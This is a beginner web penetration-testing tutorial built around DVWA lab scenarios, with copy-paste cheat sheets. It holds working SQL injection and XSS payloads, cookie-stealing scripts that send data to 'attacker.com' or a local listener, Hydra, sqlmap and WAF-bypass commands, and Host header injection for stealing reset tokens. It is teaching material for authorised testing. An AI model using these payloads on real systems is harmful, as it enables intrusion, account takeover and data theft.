# PART 1: UNDERSTANDING THE BASICS

## What is Penetration Testing?

**Simple Definition:** Penetration testing (pentesting) is like being a "good hacker" who tests websites and applications to find security holes before bad guys do.

**Think of it like this:**
- You're hired to break into a house (with permission!)
- Your job is to find all the unlocked windows and doors
- You document what you find so the owner can fix it
- You NEVER break anything or steal data

**Key Rule:** ⚠️ **ONLY test systems you own or have written permission to test!**

---

## How Web Applications Work (In Simple Terms)

### The Basic Flow

```
YOU (Browser) → Request → SERVER → Database → Response → YOU

Example:
1. You click "Login" button
2. Browser sends: username=admin, password=pass123
3. Server checks database: Is this user real?
4. Database responds: Yes/No
5. Server sends response: Welcome! or Wrong password
```

### Where Vulnerabilities Hide

**Think of a web application like a restaurant:**
- **Front Door (Login Page):** Can you sneak in without a key?
- **Kitchen (Database):** Can you peek at secret recipes?
- **Order System (Forms):** Can you trick the waiter into giving you free food?
- **Menu Board (Web Pages):** Can you write your own messages on it?

---

## Core Vulnerabilities Explained Simply

### 1. SQL Injection (SQLi) - Tricking the Database

**What is it?**
Imagine filling out a form that asks for your name, but instead of writing "John", you write special instructions that confuse the computer.

**Real-World Analogy:**
- Normal: "Show me the file for customer 'John'"
- Attack: "Show me the file for customer 'John' OR show me EVERYTHING"

**Why it's dangerous:**
- Steal all usernames and passwords
- Delete entire databases
- Take over the website

**Simple Example:**
```
Normal login: username = admin, password = secret
Hacker login: username = admin'-- , password = (anything)

What happens:
Normal query: SELECT * FROM users WHERE username='admin' AND password='secret'
Hacked query: SELECT * FROM users WHERE username='admin'-- AND password='anything'

The '--' makes the computer ignore everything after it!
So it only checks username, not password!
```

**How to spot it:**
- Forms that show database errors when you type `'` (single quote)
- Pages that change behavior with simple tricks like `' OR 1=1--`
- URLs with `?id=1` that you can manipulate

---

### 2. Cross-Site Scripting (XSS) - Injecting Your Own Code

**What is it?**
Putting your own code (usually JavaScript) into a website so it runs when other people visit.

**Real-World Analogy:**
Imagine a bulletin board where people post messages. XSS is like posting a note that says "Give me your wallet" and it actually works on whoever reads it!

**Why it's dangerous:**
- Steal login cookies (session hijacking)
- Redirect users to fake login pages
- Capture everything they type (keylogging)

**Simple Example:**
```
Normal comment: "This is a great website!"
Hacked comment: <script>alert('Hacked!')</script>

What happens:
When anyone views the comment, a popup appears saying "Hacked!"
In real attacks, the script steals cookies instead.
```

**Three Types (Simplified):**
1. **Reflected XSS:** Your malicious code appears immediately (like a search result)
2. **Stored XSS:** Your code is saved in the database and affects everyone
3. **DOM XSS:** Your code manipulates the page directly without going to the server

**How to spot it:**
- Search boxes that display what you typed
- Comment sections
- Profile pages where you can enter information
- Any place your input appears on the screen

---

### 3. Broken Authentication - Weak Login Systems

**What is it?**
When login systems have flaws that let you access accounts without knowing passwords.

**Real-World Analogy:**
Like finding out that the gym only checks your membership card photo, not your ID. So you use someone else's card!

**Common Problems:**
1. **Default passwords:** admin/admin, root/root
2. **Weak passwords allowed:** 123456, password
3. **No lockout:** Try unlimited passwords
4. **Session cookies never expire:** Steal once, use forever

**Simple Example:**
```
Basic Authentication (old method):
- Browser sends: username:password encoded in Base64
- Base64 is NOT encryption - anyone can decode it!

Example:
"admin:password123" becomes "YWRtaW46cGFzc3dvcmQxMjM="
To decode: echo "YWRtaW46cGFzc3dvcmQxMjM=" | base64 -d
Result: admin:password123
```

---

### 4. Insecure Cookies - Stealing Sessions

**What is it?**
Cookies are like "membership cards" your browser shows to prove you're logged in. If someone steals your cookie, they can pretend to be you!

**Real-World Analogy:**
A cookie is like a movie theater ticket stub. If someone takes your stub, they can watch the movie as you.

**Cookie Attributes Explained:**
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

HttpOnly  = JavaScript can't read it (protects from XSS)
Secure    = Only sent over HTTPS (protects from WiFi sniffing)
SameSite  = Prevents sneaky cross-site requests
```

**How attackers steal cookies:**
1. **XSS Attack:** `<script>alert(document.cookie)</script>` → sends cookie to attacker
2. **WiFi Sniffing:** If website uses HTTP (not HTTPS), anyone on same WiFi can see cookies
3. **Session Fixation:** Trick you into using attacker's cookie

---

### 5. HTTP Header Manipulation - Tricking the Server

**What is it?**
HTTP headers are like envelopes that contain your web requests. Sometimes you can write fake return addresses!

**Real-World Analogy:**
Imagine sending a letter but writing a fake return address to trick the recipient.

**Common Headers to Test:**

```
Host: target.com
X-Forwarded-For: 127.0.0.1  (Pretend you're from localhost)
User-Agent: Googlebot       (Pretend you're Google's crawler)
Referer: https://admin.com  (Pretend you came from admin page)
```

**Why it's dangerous:**
- **Host Header Injection:** Trick password reset emails to send tokens to attacker
- **X-Forwarded-For Spoofing:** Bypass IP-based restrictions
- **User-Agent Tricks:** Access mobile-only content or admin panels

---

# PART 2: GETTING STARTED

## Understanding Your Testing Workflow

### The Pentesting Process (Simplified)

```
1. RECONNAISSANCE (Information Gathering)
   ↓
   What does the target do?
   What technologies does it use?
   Where can users input data?

2. SCANNING & ENUMERATION
   ↓
   What pages exist?
   What services are running?
   Are there known vulnerabilities?

3. VULNERABILITY DETECTION
   ↓
   Test for SQL Injection
   Test for XSS
   Test for weak authentication

4. EXPLOITATION
   ↓
   Prove the vulnerability works
   Extract data (in legal environments)
   Document findings

5. REPORTING
   ↓
   Write clear explanations
   Show proof-of-concept
   Recommend fixes
```

# PART 3: STEP-BY-STEP ATTACK SCENARIOS

## Scenario 1: Your First SQL Injection (Beginner Level)

### Target: Login Form on DVWA

**Objective:** Bypass login without knowing the password

**Step-by-Step Instructions:**

**1. Set Up DVWA**
```bash
# Start DVWA
docker run -p 80:80 vulnerables/web-dvwa

# Open browser and go to:
http://localhost

# Login with default credentials:
Username: admin
Password: password

# Set Security Level to "Low" (Settings page)
```

**2. Navigate to SQL Injection Page**
- Click "SQL Injection" in the menu
- You'll see a form asking for a User ID

**3. Test for Vulnerability**

**Normal Test:**
```
Input: 1
Click Submit
Result: Shows user information
```

**Vulnerability Test #1:**
```
Input: 1'
Click Submit
Result: You see an error like "You have an error in your SQL syntax"

🎉 CONGRATULATIONS! You found a SQL Injection vulnerability!
```

**Why did this work?**
```
Normal query: SELECT * FROM users WHERE user_id = '1'
With quote: SELECT * FROM users WHERE user_id = '1''

The extra quote breaks the SQL syntax, causing an error!
```

**4. Exploit the Vulnerability**

**Test #1: Show all users**
```
Input: 1' OR '1'='1
Result: Shows ALL users (not just user ID 1)

Explanation:
Query becomes: SELECT * FROM users WHERE user_id = '1' OR '1'='1'
Since '1'='1' is always TRUE, it returns everyone!
```

**Test #2: Use SQL comments**
```
Input: 1' OR 1=1 --
Note the space after --
Result: Shows all users

Explanation:
Query: SELECT * FROM users WHERE user_id = '1' OR 1=1 -- rest of query
The -- comments out everything after, so password check is ignored!
```

**Test #3: Extract specific data**
```
Input: 1' UNION SELECT user, password FROM users--
Result: Shows usernames AND passwords!

Explanation:
UNION combines results from two queries
You're adding your own SELECT statement to see passwords
```

**5. Advanced: Find number of columns**

Why? UNION requires same number of columns in both parts.

```
Test: 1' ORDER BY 1--
Result: Works

Test: 1' ORDER BY 2--
Result: Works

Test: 1' ORDER BY 3--
Result: Error!

Conclusion: The table has 2 columns
```

**6. Real Exploitation**
```
Input: 1' UNION SELECT user, password FROM users--

Result: You see:
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

That's a password hash! You can crack it with tools like John the Ripper or hashcat.
```

## Scenario 2: Your First XSS Attack (Beginner Level)

### Target: Comment Form on DVWA

**Objective:** Inject JavaScript that steals cookies

**Step-by-Step Instructions:**

**1. Navigate to XSS (Reflected) Page in DVWA**

**2. Test for Reflection**

**Normal Test:**
```
Input: Hello
Submit
Result: Page says "Hello Hello"
```

**Your input is reflected back to you - potential XSS!**

**3. Test Basic JavaScript**

```html
Input: <script>alert('XSS')</script>
Submit
Result: A popup appears saying "XSS"

🎉 SUCCESS! You've executed JavaScript!
```

**Why did this work?**
```
The page takes your input and puts it directly into HTML:
<p>Hello <script>alert('XSS')</script></p>

Your browser sees the <script> tag and executes it!
```

**4. Steal Cookies (Educational Purposes Only)**

**Set up a simple listener first:**

```python
# save as cookie_stealer.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class CookieHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("[+] Stolen cookie:", self.path)
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

print("[*] Listening for cookies on http://localhost:8000")
HTTPServer(('', 8000), CookieHandler).serve_forever()
```

**Run the listener:**
```bash
python3 cookie_stealer.py
```

**Inject the stealing payload:**
```html
<script>fetch('http://localhost:8000/steal?cookie=' + document.cookie)</script>
```

**What happens:**
1. You submit this payload
2. When anyone views the page, the JavaScript runs
3. It sends their cookies to your listener at localhost:8000
4. You see the stolen cookie in your terminal!

**5. Advanced: Bypass Simple Filters**

**If `<script>` is blocked, try:**

```html
<!-- Method 1: Image tag -->
<img src=x onerror=alert('XSS')>

<!-- Method 2: SVG -->
<svg onload=alert('XSS')>

<!-- Method 3: Body tag -->
<body onload=alert('XSS')>

<!-- Method 4: Iframe -->
<iframe src=javascript:alert('XSS')>
```

**Test each one until something works!**

## Scenario 3: Breaking Basic Authentication

### Target: Protected Admin Page

**Objective:** Access admin page without knowing password

**Step-by-Step Instructions:**

**1. Detect Basic Authentication**

```bash
# Try to access the admin page
curl -I http://localhost/admin

# Response shows:
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Admin Area"
```

**What this means:** The server uses Basic Authentication (old, weak method)

**2. Try Default Credentials**

```bash
# Method 1: Using curl
curl -u admin:admin http://localhost/admin
curl -u admin:password http://localhost/admin
curl -u root:root http://localhost/admin

# Method 2: In browser
# Browser will show login popup
# Try: admin / admin
```

**Common Default Credentials:**
```
admin / admin
admin / password
admin / 123456
root / root
root / toor
administrator / administrator
admin / (blank)
```

**3. If Defaults Don't Work: Brute Force**

**Create credential lists:**

```bash
# users.txt
admin
root
administrator
test

# passwords.txt
admin
password
123456
password123
admin123
```

**Use Hydra to brute force:**
```bash
hydra -L users.txt -P passwords.txt http://localhost http-get /admin

# Explanation:
# -L = user list file
# -P = password list file
# http-get = HTTP GET method
# /admin = protected path
```

**4. Alternative: Decode Existing Credentials**

If you intercepted a Basic Auth request:

```
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

**Decode it:**
```bash
echo "YWRtaW46cGFzc3dvcmQxMjM=" | base64 -d
# Output: admin:password123
```

**Now you have the credentials!**

**5. Advanced: Bypass Techniques**

**Method 1: Path Traversal**
```bash
curl http://localhost/admin/../
curl http://localhost/admin/..;/
curl http://localhost/./admin
```

**Method 2: Host Header Manipulation**
```bash
curl -H "Host: localhost" http://localhost/admin
curl -H "Host: 127.0.0.1" http://localhost/admin
```

**Method 3: HTTP Method Tampering**
```bash
# Try different HTTP methods
curl -X POST http://localhost/admin
curl -X PUT http://localhost/admin
curl -X OPTIONS http://localhost/admin
```

## Scenario 4: Cookie Manipulation for Privilege Escalation

### Target: Website with user roles in cookies

**Objective:** Change your role from "user" to "admin"

**Step-by-Step Instructions:**

**1. Log in as regular user**

**2. Capture your cookie**

**In Browser (Chrome/Firefox):**
- Press F12 to open Developer Tools
- Go to "Application" tab (Chrome) or "Storage" tab (Firefox)
- Click "Cookies" → Select your site
- Find cookie named "role" or "user_level"

**Example:**
```
Cookie name: role
Cookie value: dXNlcg==
```

**3. Decode the cookie**

```bash
# Decode from Base64
echo "dXNlcg==" | base64 -d
# Output: user
```

**4. Modify the value**

```bash
# Encode "admin" to Base64
echo -n "admin" | base64
# Output: YWRtaW4=
```

**5. Replace the cookie**

**In Browser:**
- Go back to Application/Storage tab
- Double-click the cookie value
- Replace "dXNlcg==" with "YWRtaW4="
- Press Enter
- Refresh the page

**Or use JavaScript Console:**
```javascript
document.cookie = "role=YWRtaW4="
location.reload()
```

**6. Check if you have admin access**

Try accessing admin pages:
```
http://localhost/admin/dashboard
http://localhost/admin/users
```

**🎉 If successful, you've escalated your privileges!**

---

## Scenario 5: Host Header Injection

### Target: Password Reset Function

**Objective:** Steal password reset tokens

**⚠️ WARNING: This is advanced and VERY illegal on real sites!**

**How it works (Educational Only):**

```
Normal password reset:
1. User enters email
2. Server generates reset link: https://real-site.com/reset?token=abc123
3. Email sent to user with link
4. User clicks, resets password

Attacked password reset:
1. Attacker enters victim's email
2. Attacker modifies Host header to: Host: attacker.com
3. Server generates reset link: https://attacker.com/reset?token=abc123
4. Email sent to victim with ATTACKER'S link
5. Victim clicks → token sent to attacker
6. Attacker uses token to reset victim's password
```

**Step-by-Step (Lab Environment Only):**

**1. Capture password reset request in Burp Suite**

```http
POST /forgot-password HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

email=victim@email.com
```

**2. Modify the Host header**

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@email.com
```

**3. Send the request**

**4. Check if email contains attacker.com in reset link**

```
If vulnerable, email will say:
"Click here to reset: https://attacker.com/reset?token=abc123"

If secure, email will say:
"Click here to reset: https://vulnerable-site.com/reset?token=abc123"
```

# PART 4: QUICK REFERENCE CARDS

## SQL Injection Quick Reference

### Detection Payloads (Copy-Paste These)

```sql
-- Test these one by one in input fields
'
"
' OR '1'='1
' OR 1=1--
admin'--
admin' #
' OR 'a'='a
```

**What to look for:**
- Error messages mentioning SQL or database
- Page loads differently with `' OR 1=1--`
- Page crashes or shows blank content

### Basic Exploitation Payloads

```sql
-- Login bypass
admin'--
admin' OR '1'='1'--
' OR 1=1--

-- Show all data
1' OR '1'='1
1' UNION SELECT NULL--

-- Find number of columns
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
(Keep increasing until error)

-- Extract data (replace X with column count)
1' UNION SELECT username, password FROM users--
1' UNION SELECT NULL, NULL, NULL FROM users--
```

### SQLMap Cheat Sheet (Automated Tool)

```bash
# Basic scan
sqlmap -u "http://site.com/page?id=1"

# Test POST form
sqlmap -u "http://site.com/login" --data="user=admin&pass=test"

# List databases
sqlmap -u "http://site.com/page?id=1" --dbs

# List tables in database
sqlmap -u "http://site.com/page?id=1" -D database_name --tables

# Dump table contents
sqlmap -u "http://site.com/page?id=1" -D database_name -T users --dump

# Bypass WAF
sqlmap -u "http://site.com/page?id=1" --random-agent --tamper=space2comment
```

---

## XSS Quick Reference

### Detection Payloads

```html
<!-- Test these in search boxes, comments, profile fields -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
```

**What to look for:**
- Popup box appears
- JavaScript console shows the script executed
- HTML source shows your payload unescaped

### Cookie Stealing Payloads

```html
<!-- Basic cookie stealer -->
<script>alert(document.cookie)</script>

<!-- Send to attacker server -->
<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>

<!-- Using image tag -->
<img src=x onerror="fetch('http://attacker.com?c=' + document.cookie)">
```

### Filter Bypass Techniques

```html
<!-- If <script> is blocked -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- If alert is blocked -->
<script>confirm(1)</script>
<script>prompt(1)</script>

<!-- If quotes are blocked -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- If parentheses are blocked -->
<script>onerror=alert;throw 1</script>

<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<iMg sRc=x oNeRrOr=alert(1)>

<!-- Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```

## Authentication Testing Quick Reference

### Default Credentials to Try

```
admin:admin
admin:password
admin:123456
root:root
root:toor
administrator:administrator
guest:guest
test:test
admin:(blank)
user:user
```

### Basic Auth Testing

```bash
# Test with curl
curl -u admin:admin http://site.com/admin
curl -u admin:password http://site.com/admin

# Decode Basic Auth header
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d

# Encode credentials
echo -n "admin:password" | base64
```

### Brute Force with Hydra

```bash
# HTTP GET
hydra -l admin -P passwords.txt site.com http-get /admin

# HTTP POST login form
hydra -l admin -P passwords.txt site.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

### Bypass Techniques to Try

```bash
# Path traversal
/admin/../
/./admin
/admin/..;/

# Host header manipulation
Host: localhost
Host: 127.0.0.1
Host: admin.site.com

# HTTP method tampering
POST instead of GET
PUT instead of POST
DELETE
OPTIONS

# Custom headers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

---

## Cookie Manipulation Quick Reference

### View Cookies

```javascript
// In browser console (F12)
console.log(document.cookie)

// View all cookie details
// Chrome: F12 → Application → Cookies
// Firefox: F12 → Storage → Cookies
```

### Decode Cookies

```bash
# Base64 decoding
echo "encoded_cookie" | base64 -d

# URL decoding (Python)
python3 -c "import urllib.parse; print(urllib.parse.unquote('encoded_string'))"

# JSON parsing
echo "encoded_cookie" | base64 -d | jq .
```

### Modify Cookies

```bash
# Encode modified value
echo -n "admin" | base64

# URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('value'))"
```

```javascript
// In browser console
document.cookie = "role=admin"
document.cookie = "user_level=5"
location.reload()
```

### Security Flags to Check

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

Check for:
✓ HttpOnly   - Prevents JavaScript access
✓ Secure     - Only sent over HTTPS
✓ SameSite   - Prevents CSRF

Missing flags = vulnerability!
```

## Directory Enumeration Quick Reference

### Gobuster Commands

```bash
# Basic directory scan
gobuster dir -u http://site.com -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://site.com -w wordlist.txt -x php,html,txt,js

# With authentication
gobuster dir -u http://site.com -w wordlist.txt -U admin -P password

# With cookies
gobuster dir -u http://site.com -w wordlist.txt -c "session=abc123"

# Faster (more threads)
gobuster dir -u http://site.com -w wordlist.txt -t 50
```

### FFUF Commands

```bash
# Basic fuzzing
ffuf -u http://site.com/FUZZ -w wordlist.txt

# Filter by status code
ffuf -u http://site.com/FUZZ -w wordlist.txt -mc 200,301,302

# Filter by response size
ffuf -u http://site.com/FUZZ -w wordlist.txt -fs 4242

# POST data fuzzing
ffuf -u http://site.com/login -w wordlist.txt -X POST -d "username=admin&password=FUZZ"

# Header fuzzing
ffuf -u http://site.com -w wordlist.txt -H "X-Custom: FUZZ"
```

## Troubleshooting Common Issues

### Problem: "Command not found"

**Solution:**
```bash
# Check if tool is installed
which sqlmap
which gobuster
which hydra

# If not found, install it
sudo apt install sqlmap
sudo apt install gobuster
sudo apt install hydra
```

### Problem: "Permission denied"

**Solution:**
```bash
# Run with sudo
sudo [command]

# Or make script executable
chmod +x script.py
./script.py
```

### Problem: SQLmap not finding injection

**Solutions to try:**
```bash
# Increase level and risk
sqlmap -u "URL" --level=5 --risk=3

# Try specific technique
sqlmap -u "URL" --technique=T  # Time-based

# Use tamper scripts
sqlmap -u "URL" --tamper=space2comment

# Test POST data
sqlmap -u "URL" --data="param=value"

# Use request file from Burp
sqlmap -r request.txt
```

### Problem: XSS payload gets filtered

**Solutions to try:**
```html
<!-- Try different tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>

<!-- Try encoding -->
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;lert(1)">

<!-- Try case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Try without spaces -->
<img/src=x/onerror=alert(1)>

<!-- Try without quotes -->
<img src=x onerror=alert(1)>
```

### Problem: Can't connect to target

**Solutions:**
```bash
# Check if target is up
ping site.com

# Check specific port
nmap -p 80,443 site.com

# Check if you're being blocked
curl -I http://site.com
# Look for 403 Forbidden or WAF messages

# Try different User-Agent
curl -A "Mozilla/5.0" http://site.com

# Use proxy to change IP
curl --proxy http://proxy:port http://site.com
```

### Problem: Burp Suite not intercepting

**Solutions:**
1. Check proxy settings in browser:
   - Firefox: Settings → Network Settings → Manual proxy
   - Set HTTP Proxy: 127.0.0.1, Port: 8080
2. In Burp:
   - Go to Proxy → Intercept
   - Make sure "Intercept is on" button is highlighted
3. Check if correct browser profile:
   - Use Burp's built-in browser (easier!)

## Understanding Error Messages

### SQL Errors (Good signs for SQLi)

```
MySQL:
"You have an error in your SQL syntax"
"Warning: mysql_fetch_array()"
"Unclosed quotation mark"

MSSQL:
"Unclosed quotation mark after the character string"
"Incorrect syntax near"

PostgreSQL:
"ERROR: syntax error at or near"
"unterminated quoted string"

Oracle:
"ORA-00933: SQL command not properly ended"
"ORA-01756: quoted string not properly terminated"
```

**What to do:**
If you see these errors when typing `'`, you found SQL injection!

### HTTP Status Codes

```
200 OK              - Normal, page loaded
301 Moved           - Redirect (permanent)
302 Found           - Redirect (temporary)
401 Unauthorized    - Need authentication
403 Forbidden       - Access denied (you can see it exists!)
404 Not Found       - Page doesn't exist
500 Server Error    - Something broke (good for testing!)
503 Unavailable     - Server overloaded or down
```

## Safety Reminders & Ethics

### ⚠️ LEGAL TESTING ONLY

**ALWAYS follow these rules:**

✅ **DO:**
- Test your own websites and applications
- Use practice labs (DVWA, TryHackMe, HackTheBox)
- Get written permission before testing
- Test on bug bounty programs (HackerOne, Bugcrowd)
- Document everything you find
- Report vulnerabilities responsibly

❌ **DON'T:**
- Test websites without permission
- Damage or delete data
- Access accounts that aren't yours
- Share vulnerabilities publicly before they're fixed
- Use pentesting for illegal activities
- Claim to be a "hacker" to intimidate people

### Responsible Disclosure

**If you find a real vulnerability:**

1. **Don't exploit it further**
2. **Document the issue:**
   - What page/feature is affected
   - Step-by-step reproduction
   - Potential impact
   - Your contact information
3. **Contact the company:**
   - Look for security@company.com
   - Check for bug bounty program
   - Use responsible disclosure form
4. **Give them time to fix** (typically 90 days)
5. **Don't share publicly until fixed**
